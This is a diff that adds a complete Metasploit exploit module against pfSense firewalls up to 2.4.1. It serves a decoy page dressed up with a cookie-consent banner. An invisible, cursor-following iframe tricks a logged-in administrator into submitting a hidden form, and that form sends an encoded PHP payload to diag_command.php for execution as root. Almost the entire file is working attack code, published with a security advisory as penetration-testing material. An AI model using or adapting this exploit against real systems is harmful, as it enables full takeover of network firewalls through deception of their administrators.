@@ -1,0 +1,153 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpServer::HTML
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'            => 'Clickjacking Vulnerability In CSRF Error Page pfSense',
+        'Description'     => %q{
+          This module exploits a Clickjacking vulnerability in pfSense <= 2.4.1.
+
+          pfSense is a free and open source firewall and router. It was found that the
+          pfSense WebGUI is vulnerable to Clickjacking. By tricking an authenticated admin
+          into interacting with a specially crafted webpage it is possible for an attacker
+          to execute arbitrary code in the WebGUI. Since the WebGUI runs as the root user,
+          this will result in a full compromise of the pfSense instance.
+        },
+        'Author'          => 'Yorick Koster',
+        'Payload'         => { 'BadChars' => '"' },
+        'License'         => MSF_LICENSE,
+        'References'      =>
+          [
+            ['URL', 'https://securify.nl/en/advisory/SFY20171101/clickjacking-vulnerability-in-csrf-error-page-pfsense.html'],
+            ['URL', 'https://doc.pfsense.org/index.php/2.4.2_New_Features_and_Changes']
+          ],
+        'DefaultOptions'  =>
+          {
+            'EXITFUNC'    => 'process'
+          },
+        'Arch'            => ARCH_PHP,
+        'Platform'        => 'php',
+        'Targets'         =>
+          [
+            [ 'pfSense <= 2.4.1', { 'auto' => false } ]
+          ],
+        'DefaultTarget'   => 0,
+        'DisclosureDate'  => 'Nov 21 2017'
+      )
+    )
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path to the web application', 'https://192.168.1.1'])
+      ]
+    )
+  end
+
+  def js_file
+    @js ||= lambda {
+      path = File.join(Msf::Config.data_directory, 'exploits', 'pfsense_clickjacking', 'cookieconsent.min.js')
+      return File.read(path)
+    }.call
+  end
+
+  def css_file
+    @css ||= lambda {
+      path = File.join(Msf::Config.data_directory, 'exploits', 'pfsense_clickjacking', 'cookieconsent.min.css')
+      return File.read(path)
+    }.call
+  end
+
+  def background_file
+    @background ||= lambda {
+      path = File.join(Msf::Config.data_directory, 'exploits', 'pfsense_clickjacking', 'background.jpg')
+      return File.read(path)
+    }.call
+  end
+
+  def on_request_uri(cli, request)
+    print_status("GET #{request.uri} #{request.headers['User-Agent']}")
+
+    resp = create_response(200, "OK")
+    if request.uri =~ /\.js$/
+      resp.body = js_file
+      resp['Content-Type'] = 'text/javascript'
+
+    elsif request.uri =~ /\.css$/
+      resp.body = css_file
+      resp['Content-Type'] = 'text/css'
+
+    elsif request.uri =~ /\.jpg$/
+      resp.body = background_file
+      resp['Content-Type'] = 'image/jpg'
+
+    else
+      if datastore['TARGETURI'].end_with? '/'
+        url = datastore['TARGETURI'] + 'diag_command.php'
+      else
+        url = datastore['TARGETURI'] + '/diag_command.php'
+      end
+      framename = rand_text_alpha(16)
+      divname = rand_text_alpha(16)
+      resp.body = %Q|<!DOCTYPE html>
+<html>
+<meta charset="utf-8">
+<link rel="stylesheet" type="text/css" href="#{get_resource.chomp('/')}/cookieconsent.min.css" />
+<script src="#{get_resource.chomp('/')}/cookieconsent.min.js"></script>
+<script>
+window.addEventListener("load", function(){
+window.cookieconsent.initialise({
+        "palette": {
+                "popup": {
+                        "background": "#000",
+                        "text": "#0f0"
+                },
+                "button": {
+                        "background": "#0f0"
+                }
+        },
+        "position": "top",
+        "static": true
+        });
+});
+</script>
+<script>
+document.cookie = 'cookieconsent_status=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+window.addEventListener('load', function(){
+        document.forms[0].post.click();
+        document.onmousemove = function(e) {
+                var e = e \|\| window.event;
+                var s = document.getElementById('#{divname}');
+                s.style.left  = (e.clientX - 10) + 'px';
+                s.style.top = (e.clientY - 5) + 'px';
+        };
+});
+</script>
+<body style="background-image:url(#{get_resource.chomp('/')}/background.jpg);background-size:cover;">
+<div id="#{divname}" style="position:absolute;z-index:10;border:none;width:20px;height:10px;overflow:hidden;opacity:0.0;">
+<iframe src="about:blank" name="#{framename}" sandbox="allow-forms" border="no" scrolling="no" width="800" height="800" style="width:400px;height:800px;margin-top:-70px;margin-left:-40px;"></iframe>
+</div>
+<div style="display:none">
+<form action="#{url}" method="POST" enctype="multipart/form-data" target="#{framename}">
+        <input type="hidden" name="txtPHPCommand" value="#{payload.encoded}" />
+        <input type="hidden" name="submit" value="EXECPHP" />
+        <input type="submit" name="post"/>
+</form>
+</div>
+</body>
+</html>
+|
+      resp['Content-Type'] = 'text/html'
+    end
+
+    cli.send_response(resp)
+  end
+end
